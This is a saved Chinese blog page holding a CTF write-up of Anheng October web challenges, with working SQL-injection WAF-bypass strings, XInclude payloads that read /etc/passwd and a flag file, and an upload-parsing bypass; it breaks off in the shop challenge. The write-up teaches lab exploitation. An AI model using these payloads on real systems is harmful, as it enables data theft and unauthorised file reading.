@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="0verWatch" />
+
+
+
+<meta name="description" content="前言10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好">
+<meta name="keywords" content="CTF,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒10月赛Web题目复现">
+<meta property="og:url" content="0verwatch.top/anheng-10month.html">
+<meta property="og:site_name" content="0verWatch&#39;s Blog">
+<meta property="og:description" content="前言10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iH0hd0.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iH0TWF.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHBiyd.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHBAeI.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHBMlQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHBlOs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHBapF.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHBw6J.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHB7AP.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHBL9S.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHDk3F.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHDAc4.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHDmH1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHDtHI.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHDd4f.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHD0C8.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHD2Eq.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHDW5V.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHDqV1.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHrJRU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHrYzF.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHrUsJ.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHraL9.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/11/08/iHr6zD.md.png">
+<meta property="og:updated_time" content="2018-11-08T14:04:40.774Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安恒10月赛Web题目复现">
+<meta name="twitter:description" content="前言10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/11/08/iH0hd0.md.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="0verWatch&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/crystal.png">
+
+
+
+    <link href="//lib.baomitu.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//lib.baomitu.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//lib.baomitu.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//lib.baomitu.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>安恒10月赛Web题目复现 | 0verWatch&#39;s Blog</title>
+
+<script src="//lib.baomitu.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//lib.baomitu.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//lib.baomitu.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//lib.baomitu.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//lib.baomitu.com/jqueryui/1.10.4/jquery-ui.min.js", "//lib.baomitu.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-56ff76c972fc0cf9"></script>
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?e9bf2f4b24d981680e6d59ced18982b0";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">0verWatch</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">归档</a></li>
+                        
+                            <li><a href="/tags/">分类&amp;标签</a></li>
+                        
+                            <li><a href="/friends/">友链</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CRC32爆破/">CRC32爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux安全/">Linux安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux常用命令/">Linux常用命令</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql安全配置/">Mysql安全配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Social/">Social</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Yii/">Yii</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/algorithm/">algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二分查找/">二分查找</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反序列化/">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/微机实验/">微机实验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/服务器运维/">服务器运维</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流量分析/">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境部署/">环境部署</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程语言/">编程语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网站渗透/">网站渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机网路/">计算机网路</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://202.119.201.199/">CumtCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.nuptzj.cn">NuptCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.jarvisoj.com">Jarvis OJ</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.codemonster.cn/home">MOCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.bugku.com/">BugkuCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.shiyanbar.com/ctf/practice">实验吧</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://xz.aliyun.com/">先知社区</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://shentoushi.top/">渗透师导航</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://skysec.top/">一叶飘零</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.yytpublic.cn">LaurenceYu</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://chun.ringfall.me">ringfall</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">0verWatch</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">0verWatch</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">归档</a></li>
+                
+                    <li><a href="/tags/">分类&amp;标签</a></li>
+                
+                    <li><a href="/friends/">友链</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" target="_blank" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" target="_blank" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-anheng-10month" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/anheng-10month.html" class="article-date">
+      <time datetime="2018-11-08T12:46:41.000Z" itemprop="datePublished">2018-11-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      安恒10月赛Web题目复现
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好<a id="more"></a>，质量还是有保证的，学到很多东西</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="easy-audit"><a href="#easy-audit" class="headerlink" title="easy audit"></a>easy audit</h3><p>这个题目确实有点脑洞。。运用了两个php函数一个是<code>get_defined_functions</code>这个函数是用于返回所有已定义函数的数组，而另外一个则是<code>get_defined_vars</code> 这个函数是返回由所有已定义变量所组成的数组<br>可以查看此网址:<a href="https://www.jb51.net/article/42890.htm" target="_blank" rel="noopener">https://www.jb51.net/article/42890.htm</a></p>
+<p>右键查看源代码发现存在<code>index.php?func1</code>，那么这个参数究竟有什么作用可以先尝试一下，上手就来一个phpinfo，发现直接有回显<br><a href="https://imgchr.com/i/iH0hd0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0hd0.md.png" alt="iH0hd0.md.png"></a><br>猜测是直接运行函数之类的功能,然后运用get_defined_functions 获得全局的函数这里面的函数有内置的也有开发人员自己定义的函数，可以发现最后的这一个函数特别显眼，调用一下这个函数发现有源码出来<br><a href="https://imgchr.com/i/iH0TWF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0TWF.md.png" alt="iH0TWF.md.png"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include 'real_flag.php';</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jam_source_ctf_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jam_flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])?$_GET[<span class="string">'a'</span>]:<span class="string">'123'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_str</span><span class="params">($m=<span class="number">6</span>)</span></span>&#123;</span><br><span class="line">        $str = <span class="string">''</span>;</span><br><span class="line">        $str_list = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$m;$i++)&#123;</span><br><span class="line">            $str .= $str_list[rand(<span class="number">0</span>,strlen($str_list)<span class="number">-1</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">GiveYouTheFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">        $secret = <span class="keyword">$this</span>-&gt;gen_str();</span><br><span class="line">        <span class="comment">//echo $secret;</span></span><br><span class="line">        <span class="keyword">if</span>($secret === <span class="keyword">$this</span>-&gt;a)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $real_flag;<span class="comment">//echo $flag</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'want to use me?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;GiveYouTheFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rand().<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$_flag = <span class="keyword">new</span> jam_flag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]) &amp;&amp; $_POST[<span class="string">'flag'</span>] === <span class="string">'I want the flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">    $_flag-&gt;GiveYouTheFlag();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这段代码大致的意思就是新建了一个类，然后调用类里面的函数把flag给输出来<br>这里我们用到<code>get_defined_vars</code>这个函数，单独使用是不能输出flag的，可能到这里会存在疑问输出flag的函数应该还得满足<code>$secret === $this-&gt;a</code>而这个secret又是随机生成的，那要怎么办，其实不需要，这里的flag是属于<code>real_flag.php</code>里面的只要我们把页面包含进来我们就可以把该页面所有变量值都给打印出来了，所以关键点还得满足这个条件<br><code>isset($_POST[&#39;flag&#39;]) &amp;&amp; $_POST[&#39;flag&#39;] === &#39;I want the flag&#39;</code><br>即可包含real_flag.php，这应该是出题人故意留的不然也输出不了flag，23333<br><a href="https://imgchr.com/i/iHBiyd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBiyd.md.png" alt="iHBiyd.md.png"></a><br>发包得到flag<br><a href="https://imgchr.com/i/iHBAeI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBAeI.md.png" alt="iHBAeI.md.png"></a></p>
+<h3 id="手速要快"><a href="#手速要快" class="headerlink" title="手速要快"></a>手速要快</h3><p>这个题目进去之后要登录，右键查看源代码找找http头部啥的发现里面有一个password，直接复制提交就可以登陆上去，登陆以后是一个upload页面<br><img src="https://s1.ax1x.com/2018/11/08/iHBMlQ.png" alt="iHBMlQ.png"><br><img src="https://s1.ax1x.com/2018/11/08/iHBlOs.png" alt="iHBlOs.png"></p>
+<p>然后尝试上传一个小马，发现不行，然后尝试改一下后缀发现这应该是黑名单过滤的，因为尝试了<code>php2,php3.php4</code>都可以上传，但是却不能解析把他们都当做文本解析了<br><a href="https://imgchr.com/i/iHBapF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBapF.md.png" alt="iHBapF.md.png"></a><br>但是可以发现服务器版本是<code>Apache/2.4.6</code>，这里可能存在解析漏洞，把后缀名改为Apache不认识的就可以了<br><a href="https://imgchr.com/i/iHBw6J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBw6J.md.png" alt="iHBw6J.md.png"></a><br><a href="https://imgchr.com/i/iHB7AP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHB7AP.md.png" alt="iHB7AP.md.png"></a><br>flag直接在上层目录flag{698539765730b69026796420b9201e03}</p>
+<h2 id="CoolCms"><a href="#CoolCms" class="headerlink" title="CoolCms"></a>CoolCms</h2><p>原来这个题一叶飘零学长出的额2333<br>这个网站两个地方可能存在漏洞一个就是<code>article.php</code>页面存在SQL注入，因为这里面id参数暴露了出来，另外就是在<code>write.php</code>页面上可能存在xxe文件读取<br>现在可能存在的注入页面输入3的时候就会出现<code>table flag????</code>，再fuzz测试一下发现<code>or，update，delete，</code>以及逗号等符号都被过滤了<br><a href="https://imgchr.com/i/iHBL9S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBL9S.md.png" alt="iHBL9S.md.png"></a></p>
+<p>本来就是飘零学长出的题目就去参考他的博客呀<br><a href="http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/" target="_blank" rel="noopener">http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/</a><br><a href="http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/" target="_blank" rel="noopener">http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/</a></p>
+<p>我们可以从fuzz的结果发现这里面的<code>union</code>还有<code>select</code>都可以单独使用但一旦他们两个一起使用的时候，就会被waf掉，猜测后台写的正则是这样写的<code>|union select|</code>，我们就可以使用<code>%0b</code>将其绕过，也就是<code>union%0bselect</code><br>但是逗号又被过滤了，这个时候就可以用<code>join</code>去绕过<br><img src="https://s1.ax1x.com/2018/11/08/iHDk3F.png" alt="iHDk3F.png"><br>用<code>join</code>实现同样的效果<br><a href="https://imgchr.com/i/iHDAc4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDAc4.md.png" alt="iHDAc4.md.png"></a></p>
+<p><code>or</code>被过滤了，<code>information_schema</code>没法使用，虽然题目这里提示了我们表名为flag，但是字段名却无从知晓，这时候就可以利用联合填充来代替掉字段名和表名<br><img src="https://s1.ax1x.com/2018/11/08/iHDmH1.png" alt="iHDmH1.png"></p>
+<p><a href="https://imgchr.com/i/iHDtHI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDtHI.md.png" alt="iHDtHI.md.png"></a><br>可以发现现在字段名变成了1,2,3，所以要查找里面的内容可以用用下面的语句<br><code>select * from users where id=-1 union select 1,(select i.2 from (select 1,2,3 union select * from users)i limit 1,1),3;</code><br><a href="https://imgchr.com/i/iHDd4f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDd4f.md.png" alt="iHDd4f.md.png"></a></p>
+<p>这样即可无需字段名来查找数据，然后通过limit语句一条条查即可，这里是因为逗号被过滤了所以我们用offset来替代<br>因此先测试一下哪一列有回显<br><code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select 4)l--+</code>发现第二列跟第四列有回显<br><a href="https://imgchr.com/i/iHD0C8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD0C8.md.png" alt="iHD0C8.md.png"></a></p>
+<p>接着直接用上面的套路读出flag的路径<code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select i.4 from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)i limit 1 offset 1)l-- k</code><br>得到路径是<code>/home/fff123aggg</code><br><a href="https://imgchr.com/i/iHD2Eq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD2Eq.md.png" alt="iHD2Eq.md.png"></a><br>开始用xxe读取文件，先试一下<code>/etc/passwd</code>,成功回显<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><a href="https://imgchr.com/i/iHDW5V" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDW5V.md.png" alt="iHDW5V.md.png"></a><br>然后读取flag<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///home/fff123aggg"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>得到flag{316f87681354a715d6134c4b8166aa73}</p>
+<h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>这个题是个代码审计的题目，先把源码给down下来<br>打开这个网站发现有登陆注册功能，以及购买flag的功能，但是这里面要想得到真正的flag却需要<code>888</code>积分才可以购买，这个时候就感觉应该是越权购买flag的漏洞了。。。。<br>发现源码里面有数据库文件打开看一下，发现是存在管理员的，并且id是<code>16</code>，这个东西后期有用，而且他有<code>30000</code>积分，够买很多flag了，<br><a href="https://imgchr.com/i/iHDqV1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDqV1.md.png" alt="iHDqV1.md.png"></a><br><img src="https://s1.ax1x.com/2018/11/08/iHrJRU.png" alt="iHrJRU.png"></p>
